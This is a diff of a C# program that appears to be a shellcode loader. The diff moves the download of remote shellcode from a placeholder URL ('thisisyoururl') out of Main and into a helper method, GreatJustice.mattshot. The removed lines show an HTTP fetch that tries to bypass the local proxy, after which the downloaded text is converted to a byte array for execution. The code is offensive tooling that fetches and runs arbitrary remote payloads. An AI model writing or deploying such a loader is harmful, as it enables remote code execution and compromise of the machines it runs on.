@@ -1,6 +1,4 @@
 ﻿using System;
-using System.IO;
-using System.Net;
 using System.Runtime.InteropServices;
 
 namespace Code
@@ -55,35 +53,17 @@ namespace Code
 
         static void Main()
         {
-            string shellcode = "";
-            
-
-
-
 
             //OHAI! Put your URL here. Has to be a file.
-            
-             
-            var mattsHot = "thisisyoururl";
+
+           var shellcode = GreatJustice.mattshot("thisisyoururl");
 
 
 
 
 
 
-            //Download for great justice
-            WebRequest webRequest = WebRequest.Create(mattsHot);
-            webRequest.Method = WebRequestMethods.Http.Get;
 
-            //Attempt to bypass local proxy
-            //Comment this line out if it makes your run puke.
-            webRequest.Proxy = new WebProxy();
-
-            WebResponse webResponse = webRequest.GetResponse();
-            Stream webResponseStream = webResponse.GetResponseStream();
-            StreamReader reader = new StreamReader(webResponseStream);
-            shellcode = reader.ReadToEnd();
-            webResponseStream.Close();
 
             //Make a byte array flazzle zazzle
             byte[] sc = new byte[shellcode.Length];
